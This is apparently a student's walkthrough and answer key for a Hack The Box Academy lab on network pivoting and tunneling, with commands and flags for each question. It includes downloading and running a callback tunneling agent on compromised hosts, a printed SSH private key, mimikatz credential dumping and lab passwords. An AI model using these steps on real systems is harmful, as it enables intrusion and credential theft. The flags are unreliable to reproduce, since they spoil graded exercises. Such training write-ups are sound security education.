# Pivoting, Tunneling, and Port Forwarding

## Introduction

### The Networking Behind Pivoting

1. **Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?**

answer: **eth0**

2. **Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?**

answer: **tun0**

3. **Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?** 

answer: **178.62.64.1**

## Choosing The Dig Site & Starting Our Tunnels

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

1. **You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)**

SSH to with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

```
ssh ubuntu@10.129.202.64
ip a
```

<p align="center"> 
<img src="images/ips.png" width="600" alt="Resultado de Nmap">
</p>

answer: **3**

2. **Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.**

Dentro de la sesión, intentamos hacer ping a la ip que le tenemos hacer pivoting 172.16.5.19

```
ping -c 1 172.16.5.19
```

<p align="center"> 
<img src="images/ping.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, utilizaremos la herramienta **ligolo**, en nuestra kali nos descargamos tanto el proxy como el agente. 

Proxy

```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

Agente

```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```

Configuramos el proxy

```
sudo ip tuntap add user dani mode tun ligolo  
sudo ip link set ligolo up
sudo ./proxy -selfcert
```

<p align="center"> 
<img src="images/proxy activado.png" width="600" alt="Resultado de Nmap">
</p>

Configuración del agente, en primer lugar tenemos que enviar el agente a la maquina objetivo

```
python3 -m http.server 80
```

En la maquina objetivo:

```
wget http://10.10.15.161/agent
chmod +x agent
./agent -connect 10.10.15.161:11601 -ignore-cert
```

<p align="center"> 
<img src="images/agent.png" width="600" alt="Resultado de Nmap">
</p>

En la kali aparecerá que está conectado.

```
session
1 
start
```

<p align="center"> 
<img src="images/proxy123.png" width="600" alt="Resultado de Nmap">
</p>

Nos quedará un último paso, realizar este último comando:

```
sudo ip route add 172.16.5.0/24 dev ligolo
```

Al realizar ping a este ip en nuestra kali, lograremos obtener conexion. por tanto nos conectaremos por RDP para recoger la flag.txt

```
xfreerdp /u:victor /p:pass@123 /v:172.16.5.19 /size:95% /dynamic-resolution +clipboard
```

answer: **N1c3Piv0t**

### Remote/Reverse Port Forwarding with SSH

1. **Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

SSH to 10.129.202.64 (ACADEMY-PIVOTING-LINUXPIV), with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

```
ssh ubuntu@10.129.7.33
ip a
```

<p align="center"> 
<img src="images/ip a 1.png" width="600" alt="Resultado de Nmap">
</p>

answer: **172.16.5.129**

2. **What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**

answer: **0.0.0.0**

### Meterpreter Tunneling & Port Forwarding

1. **What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

SSH to 10.129.7.33 (ACADEMY-PIVOTING-LINUXPIV), with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

```
ssh ubuntu@10.129.7.33
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

<p align="center"> 
<img src="images/ips-1.png" width="600" alt="Resultado de Nmap">
</p>

answer: **172.16.5.19,172.16.5.129**

2. **Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**

answer: **172.16.4.0/255.255.254.0**

## Playing Pong with Socat

### Socat Redirection with a Reverse Shell

1. **SSH tunneling is required with Socat. True or False?**

SSH to 10.129.7.33 (ACADEMY-PIVOTING-LINUXPIV), with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

answer: **false**

### Socat Redirection with a Bind Shell

1. **What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)**

SSH to 10.129.7.33 (ACADEMY-PIVOTING-LINUXPIV), with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

answer: **windows/x64/meterpreter/bind_tcp**

### Pivoting Around Obstacles

1. **Attempt to use Plink from a Windows-based attack host. Set up a proxy connection and RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. When finished, submit "I tried Plink" as the answer.**

answer: **I tried Plink**

### SSH Pivoting with Sshuttle

1. **Try using sshuttle from Pwnbox to connect via RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. Once completed type: "I tried sshuttle" as the answer.**

answer: **I tried sshuttle**

### Web Server Pivoting with Rpivot

1. **From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**

answer: **Attack Host**

2. **From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**

answer: **Pivot Host**

3. **Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.**

SSH to with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

Tenemps que repetir los mismos pasos que hemos realizado con ligolo en los ejercicios anteriores, añadimos la ip 172.16.5.135 con el siguiente comando: 

```
sudo ip route add 172.16.4.0/23 dev ligolo
```

Luego visitando la pagina `http://172.16.5.135/`

<p align="center"> 
<img src="images/solucionç.png" width="600" alt="Resultado de Nmap">
</p>

answer: **I_L0v3_PrOxy_Ch@ins**

### Port Forwarding with Windows Netsh

1. **Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)**

Antes tenemos que tener activado ligolo en nuestro kali.

```
sudo ip tuntap add user dani mode tun ligolo  
sudo ip link set ligolo up
sudo ./proxy -selfcert
```

El agente que me he tenido que descargar esta [aqui](https://github.com/nicocha30/ligolo-ng/releases?page=2)

<p align="center"> 
<img src="images/descargaremos este ligolo.png" width="600" alt="Resultado de Nmap">
</p>

Lo descargamos en nuestro kali, y activamos el puerto de escucha.

```
python3 -m http.server 80
```

Luego, en la maquina objetivo (Windows) lo descargamos y activamos con el siguiente comando

```
iwr -Uri "http://10.10.15.161:80/agent.exe" -OutFile "C:\herramienta\agent.exe"
./agent -connect 10.10.15.161:11601 -ignore-cert
```

<p align="center"> 
<img src="images/ñogpñpwindows.png" width="600" alt="Resultado de Nmap">
</p>

Luego, en kali

<p align="center"> 
<img src="images/kali ligolo.png" width="600" alt="Resultado de Nmap">
</p>

añado la ipp que me interesa y observo si hay ping. 

```
sudo ip route add 172.16.4.0/23 dev ligolo
```

<p align="center"> 
<img src="images/ping-1.png" width="600" alt="Resultado de Nmap">
</p>

```
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 
```

**Aproved Vendors** - **VendorContacts.txt**

answer: **Jim Flipflop**

## Branching Out Our Tunnels

### DNS Tunneling with Dnscat2

1. **Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.**

RDP to with user "<font color="#00b050">htb-student</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

```
xfreerdp /v:10.129.7.72 /u:htb-student /p:HTB_@cademy_stdnt!
```

**C:\Users\htb-student\Documents\flag.txt**

answer: **AC@tinth3Tunnel**

### SOCKS5 Tunneling with Chisel

1. **Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.**

SSH to with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

ME HE DADO CUENTA QUE SIEMPRE ES LA MISMA MAQUINA. 

**C:\Users\victor\Documents\flag.txt**

answer: `Th3$eTunne1$@rent8oring!`

### ICMP Tunneling with SOCKS

1. **Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.**

SSH to 10.129.7.74 (ACADEMY-PIVOTING-LINUXPIV), with user "<font color="#00b050">ubuntu</font>" and password "<font color="#c00000">HTB_@cademy_stdnt!</font>"

ME HE DADO CUENTA QUE SIEMPRE ES LA MISMA MAQUINA. 

**C:\Users\victor\Downloads\flag.txt**

answer: **N3Tw0rkTunnelV1sion!**

## Double Pivots

### RDP and SOCKS Tunneling with SocksOverRDP

1. **Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.**

```
xfreerdp /v:10.129.7.78 /u:htb-student /p:HTB_@cademy_stdnt!
```

Una vez iniciado sesion, nos daremos cuenta que no hay conexion con la ip **172.16.6.155** para ello nos tendremos que conectar con el usuario victor para ello tendremos antes que establecer la red de pivoting. Lo haremos rápido, ya que lo hemos practicado en los ejercicios anteriores.

En la kali activamos ligolo:

```
sudo ip tuntap add user dani mode tun ligolo  
sudo ip link set ligolo up
sudo ./proxy -selfcert
```

Luego preparamos el puerto de escucha donde tenemos preparado el agente de windows:

```
python3 -m http.server 80
```

En windows, en la carpeta / haremos lo siguiente:

```
mkdir herramienta
cd herramienta
iwr -Uri "http://10.10.15.161:80/agent.exe" -OutFile "C:\herramienta\agent.exe"
./agent -connect 10.10.15.161:11601 -ignore-cert
```

<p align="center"> 
<img src="images/Pivoting.png" width="600" alt="Resultado de Nmap">
</p>

Añadimos la ip que nos interesa: 

```
sudo ip route add 172.16.4.0/23 dev ligolo
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /dynamic-resolution
```

Luego, dentro de la sesiona activamos el escritorio remoto e introducimos las credenciales de victor. Tardará un rato, Luego nos vamos a la siguiente dirreción **C:\Users\jason\Desktop** y obtenemos la flag.txt

answer: **H0pping@roundwithRDP!**

## Skills Assessment

### Skills Assessment 

1. **Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**

Ingresamos en el navegador en esta pagina: `http://10.129.7.230/`, en la siguiente ruta nos encontramos el **id_rsa** del usuario **webadmin**

```
cat /home/webadmin/id_rsa
```

>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvm9BTps6LPw35+tXeFAw/WIB/ksNIvt5iN7WURdfFlcp+T3fBKZD
HaOQ1hl1+w/MnF+sO/K4DG6xdX+prGbTr/WLOoELCu+JneUZ3X8ajU/TWB3crYcniFUTgS
PupztxZpZT5UFjrOD10BSGm1HeI5m2aqcZaxvn4GtXtJTNNsgJXgftFgPQzaOP0iLU42Bn
IL/+PYNFsP4he27+1AOTNk+8UXDyNftayM/YBlTchv+QMGd9ojr0AwSJ9+eDGrF9jWWLTC
o9NgqVZO4izemWTqvTcA4pM8OYhtlrE0KqlnX4lDG93vU9CvwH+T7nG85HpH5QQ4vNl+vY
noRgGp6XIhviY+0WGkJ0alWKFSNHlB2cd8vgwmesCVUyLWAQscbcdB6074aFGgvzPs0dWl
qLyTTFACSttxC5KOP2x19f53Ut52OCG5pPZbZkQxyfG9OIx3AWUz6rGoNk/NBoPDycw6+Y
V8c1NVAJakIDRdWQ7eSYCiVDGpzk9sCvjWGVR1UrAAAFmDuKbOc7imznAAAAB3NzaC1yc2
EAAAGBAL5vQU6bOiz8N+frV3hQMP1iAf5LDSL7eYje1lEXXxZXKfk93wSmQx2jkNYZdfsP
zJxfrDvyuAxusXV/qaxm06/1izqBCwrviZ3lGd1/Go1P01gd3K2HJ4hVE4Ej7qc7cWaWU+
VBY6zg9dAUhptR3iOZtmqnGWsb5+BrV7SUzTbICV4H7RYD0M2jj9Ii1ONgZyC//j2DRbD+
IXtu/tQDkzZPvFFw8jX7WsjP2AZU3Ib/kDBnfaI69AMEiffngxqxfY1li0wqPTYKlWTuIs
3plk6r03AOKTPDmIbZaxNCqpZ1+JQxvd71PQr8B/k+5xvOR6R+UEOLzZfr2J6EYBqelyIb
4mPtFhpCdGpVihUjR5QdnHfL4MJnrAlVMi1gELHG3HQetO+GhRoL8z7NHVpai8k0xQAkrb
cQuSjj9sdfX+d1LedjghuaT2W2ZEMcnxvTiMdwFlM+qxqDZPzQaDw8nMOvmFfHNTVQCWpC
A0XVkO3kmAolQxqc5PbAr41hlUdVKwAAAAMBAAEAAAGAJ8GuTqzVfmLBgSd+wV1sfNmjNO
WSPoVloA91isRoU4+q8Z/bGWtkg6GMMUZrfRiVTOgkWveXOPE7Fx6p25Y0B34prPMXzRap
Ek+sELPiZTIPG0xQr+GRfULVqZZI0pz0Vch4h1oZZxQn/WLrny1+RMxoauerxNK0nAOM8e
RG23Lzka/x7TCqvOOyuNoQu896eDnc6BapzAOiFdTcWoLMjwAifpYn2uE42Mebf+bji0N7
ZL+WWPIZ0y91Zk3s7vuysDo1JmxWWRS1ULNusSSnWO+1msn2cMw5qufgrZlG6bblx32mpU
XC1ylwQmgQjUaFJP1VOt+JrZKFAnKZS1cjwemtjhup+vJpruYKqOfQInTYt9ZZ2SLmgIUI
NMpXVqIhQdqwSl5RudhwpC+2yroKeyeA5O+g2VhmX4VRxDcPSRmUqgOoLgdvyE6rjJO5AP
jS0A/I3JTqbr15vm7Byufy691WWHI1GA6jA9/5NrBqyAFyaElT9o+BFALEXX9m1aaRAAAA
wQDL9Mm9zcfW8Pf+Pjv0hhnF/k93JPpicnB9bOpwNmO1qq3cgTJ8FBg/9zl5b5EOWSyTWH
4aEQNg3ON5/NwQzdwZs5yWBzs+gyOgBdNl6BlG8c04k1suXx71CeN15BBe72OPctsYxDIr
0syP7MwiAgrz0XP3jCEwq6XoBrE0UVYjIQYA7+oGgioY2KnapVYDitE99nv1JkXhg0jt/m
MTrEmSgWmr4yyXLRSuYGLy0DMGcaCA6Rpj2xuRsdrgSv5N0ygAAADBAOVVBtbzCNfnOl6Q
NpX2vxJ+BFG9tSSdDQUJngPCP2wluO/3ThPwtJVF+7unQC8za4eVD0n40AgVfMdamj/Lkc
mkEyRejQXQg1Kui/hKD9T8iFw7kJ2LuPcTyvjMyAo4lkUrmHwXKMO0qRaCo/6lBzShVlTK
u+GTYMG4SNLucNsflcotlVGW44oYr/6Em5lQ3o1OhhoI90W4h3HK8FLqldDRbRxzuYtR13
DAK7kgvoiXzQwAcdGhXnPMSeWZTlOuTQAAAMEA1JRKN+Q6ERFPn1TqX8b5QkJEuYJQKGXH
SQ1Kzm02O5sQQjtxy+iAlYOdU41+L0UVAK+7o3P+xqfx/pzZPX8Z+4YTu8Xq41c/nY0kht
rFHqXT6siZzIfVOEjMi8HL1ffhJVVW9VA5a4S1zp9dbwC/8iE4n+P/EBsLZCUud//bBlSp
v0bfjDzd4sFLbVv/YWVLDD3DCPC3PjXYHmCpA76qLzlJP26fSMbw7TbnZ2dxum3wyxse5j
MtiE8P6v7eaf1XAAAAHHdlYmFkbWluQGlubGFuZWZyZWlnaHQubG9jYWwBAgMEBQY=
-----END OPENSSH PRIVATE KEY-----

Lo guardo en mi kali con el nombre **id_rsa**, luego le damos el siguiente permiso al archivo:

```
chmod 600 id_rsa
ssh -i id_rsa webadmin@10.129.7.230
```

Obtenemos acceso a la ssh desde nuestra kali.

answer: **webadmin**

2. **Submit the credentials found in the user's home directory. (Format: user:password)**

Para responder esta pregunta nos tendremos que ir la siguiente ruta

```
cat /home/webadmin/for-admin-eyes-only
```

answer: **mlefay:Plain Human work!**

3. **Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**

Una vez iniciado la sesión comprobamos la ip que tenemos presente:

```
ip a
```

<p align="center"> 
<img src="images/ipsskill.png" width="600" alt="Resultado de Nmap">
</p>

Luegonn realizamos el siguiente comando que ip tenemos ping.

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

<p align="center"> 
<img src="images/pingslill.png" width="600" alt="Resultado de Nmap">
</p>

answer: **172.16.5.35**

4. **Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**

A continuación, utilizaremos la herramienta **ligolo**, en nuestra kali nos descargamos tanto el proxy como el agente. 

Proxy

```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

Agente

```
sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
tar -xvf ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```

Configuramos el proxy

```
sudo ip tuntap add user dani mode tun ligolo  
sudo ip link set ligolo up
sudo ./proxy -selfcert
```

<p align="center"> 
<img src="images/proxy activado.png" width="600" alt="Resultado de Nmap">
</p>

Configuración del agente, en primer lugar tenemos que enviar el agente a la maquina objetivo

```
python3 -m http.server 80
```

En la maquina objetivo:

```
wget http://10.10.15.161/agent
chmod +x agent
./agent -connect 10.10.15.161:11601 -ignore-cert
```

<p align="center"> 
<img src="images/agent.png" width="600" alt="Resultado de Nmap">
</p>

En la kali aparecerá que está conectado.

```
session
1 
start
```

<p align="center"> 
<img src="images/ligoloproxy.png" width="600" alt="Resultado de Nmap">
</p>

Añadimos la ip.

```
sudo ip route add 172.16.0.0/16 dev ligolo
```

Luego iniciamos sesión.

```
xfreerdp /u:mlefay /p:'Plain Human work!' /v:172.16.5.35 /size:95% /dynamic-resolution +clipboard
```

Abrimos la powershell como admin, en la carpeta raiz encontraremos la flag.txt

answer: **S1ngl3-Piv07-3@sy-Day**

5. **In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**

Para responder esta preguntas usaremos la herramienta **mimikatz.exe** una forma de trasladarlo a la maquina objetivo seria copiar y luego pegarlo en el escritorio.

<p align="center"> 
<img src="images/mimikatzs.png" width="600" alt="Resultado de Nmap">
</p>

```
cd C:\users\mlefay\Desktop
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

<p align="center"> 
<img src="images/usercredenctials.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> **vfrank**:**Imply wet Unmasked!**

6. **For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.**

Empezaremos que ip tenemos disponible en la máquina.

```
ipconfig
```

<p align="center"> 
<img src="images/ipswindwos.png" width="600" alt="Resultado de Nmap">
</p>

Seguimos en la sesión de powershell de windows, realizaremos el siguiente comando para ver que ip hace ping 

```
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

<p align="center"> 
<img src="images/ips-2.png" width="600" alt="Resultado de Nmap">
</p>

Luego, usaremos **Remote Desktop CONNECTION**

<p align="center"> 
<img src="images/remote desktop.png" width="600" alt="Resultado de Nmap">
</p>

Luego, en la raíz encontraremos la flag que piden.

<p align="center"> 
<img src="images/flag.txt.png" width="600" alt="Resultado de Nmap">
</p>

answer: **N3tw0rk-H0pp1ng-f0R-FuN**

7. **Submit the contents of C:\Flag.txt located on the Domain Controller.**

<p align="center"> 
<img src="images/AutomateDCAdmin.png" width="600" alt="Resultado de Nmap">
</p>

Escogemos **AutomateDCAdmin** y dentro encontremos la flag.txt faltante.

answer: **3nd-0xf-Th3-R@inbow!**